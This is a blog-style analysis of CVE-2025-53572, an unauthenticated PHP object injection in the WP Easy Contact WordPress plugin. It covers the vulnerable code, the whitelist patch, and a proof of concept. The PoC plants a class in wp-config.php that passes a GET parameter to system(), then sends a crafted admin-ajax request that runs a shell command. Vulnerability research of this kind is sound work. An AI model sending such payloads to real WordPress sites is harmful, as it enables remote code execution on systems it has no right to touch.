---
title: CVE-2025-53572 Analysis & POC
description: Security Vulnerability in WordPress WP Easy Contact Plugin.
date: 2025-11-18 19:00:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, php object injection]
images: ["app.jpg"]
featuredImage: "app.jpg"

lightgallery: true

toc:
    auto: false
---

<!--more-->

## CVE & Basic Info

The **Deserialization of Untrusted Data** vulnerability in **emarket-design WP Easy Contact** allows **Object Injection**.
This issue affects **WP Easy Contact**: from *n/a* to **4.0.1**.

* **CVE ID**: [CVE-2025-53572](https://www.cve.org/CVERecord?id=CVE-2025-53572)
* **Vulnerability Type**: PHP Object Injection
* **Affected Versions**: <= 4.0.1
* **Patched Versions**: 4.0.2
* **CVSS severity**: High (8.1)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress WP Easy Contact Plugin](https://wordpress.org/plugins/wp-easy-contact/)

## Requirements

* **Local WordPress & Debugging**

  * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
  * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version – WP Easy Contact**

  * `4.0.1` – **vulnerable**
  * `4.0.2` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) or any diff tool.

## Cause

The vulnerability originates from allowing attackers to instantiate arbitrary objects from input → **PHP Object Injection**.

```php {title="widget-functions.php v4.0.1" hl_lines=[2]}
$widg_arr = explode("-", $div_id);
$mywidg = new $widg_arr[1]();
```

The patch adds a whitelist and sanitizes the input → only valid classes can be instantiated, removing the vulnerability.

![Diff](diff.png "Changes in the patch")

## Analysis

The plugin registers an Ajax action for unauthenticated users (`wp_ajax_nopriv`):

```php
add_action('wp_ajax_nopriv_emd_get_widg_pagenum', 'emd_get_widg_pagenum');
```

When a request is sent to `/wp-admin/admin-ajax.php` with `action=emd_get_widg_pagenum`, the callback `emd_get_widg_pagenum` is executed:

```php {title="widget-functions.php v4.0.1" hl_lines=[10] data-open=true}
function emd_get_widg_pagenum(){
	$response = false;
	$pageno = isset($_GET['pageno']) ? (int) $_GET['pageno'] : 1;
	$div_id = isset($_GET['div_id']) ? sanitize_text_field($_GET['div_id']) : '';
	$myapp = isset($_GET['app']) ? sanitize_text_field($_GET['app']) : '';
	if(!empty($div_id)){
		$pids = Array();
		$front_ents = emd_find_limitby('frontend', $myapp);
		$widg_arr = explode("-",$div_id);
		$mywidg = new $widg_arr[1]();
		...
	}
}
```

For the line `new $widg_arr[1]()` to run, the condition `if(!empty($div_id))` must be satisfied, meaning the GET parameter `div_id` has to be provided.

`$widg_arr[1]` is taken from the array obtained after `explode` on the value of `$_GET['div_id']`.
For example, if `div_id=abc-Class`, then `$widg_arr[1]` equals `Class`, allowing arbitrary object instantiation through `new $widg_arr[1]()`.

## Flow

{{< mermaid >}}
graph TD
A["Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum&div_id=abc-Class"]
--> B["WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum"]

B --> C["Callback: emd_get_widg_pagenum()"]

C --> D{"Check if div_id is not empty"}
D -- True --> E["explode('-', div_id) → $widg_arr"]
E --> F["Instantiate object: new $widg_arr[1]()"]
{{< /mermaid >}}

## Proof of Concept (PoC)

1. Create a test class inside `wp-config.php`:

```php {data-open=true}
class ObjectInjection {
  public $command;

  public function __construct(){
    $this->command = $_GET['cmd'];
  }
  function __destruct(){
    die(system($this->command));
  }
}
```

2. Send the request with payload:

```http
GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum&div_id=abc-ObjectInjection&cmd=ls+/
```

![Result](result.png "Result")

# Conclusion

The vulnerability in **WP Easy Contact <= 4.0.1** stems from unsafe input handling, allowing direct object instantiation from user-controlled data. By abusing the `div_id` parameter, attackers can achieve **PHP Object Injection** leading to arbitrary code execution. The patch in **4.0.2** fixes the issue by introducing a whitelist and sanitizing input, ensuring only valid classes can be instantiated. This clearly demonstrates how unsafe deserialization can become a critical exploit vector, especially when combined with unauthenticated access.

# Key Takeaways

* **Unauthenticated attack surface**: Triggered via `wp_ajax_nopriv`, no login required.
* **Root cause**: Directly using user input (`new $widg_arr[1]()`), no validation.
* **Fix strategy**: Apply **whitelist** and **sanitize** to restrict valid classes.
* **Best practice**: Always validate and sanitize input, avoid unsafe deserialization, and restrict object instantiation from untrusted sources.

## References

[Deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)

[WordPress WP Easy Contact Plugin <= 4.0.1 is vulnerable to a high priority PHP Object Injection](https://patchstack.com/database/wordpress/plugin/wp-easy-contact/vulnerability/wordpress-wp-easy-contact-plugin-4-0-1-php-object-injection-vulnerability)
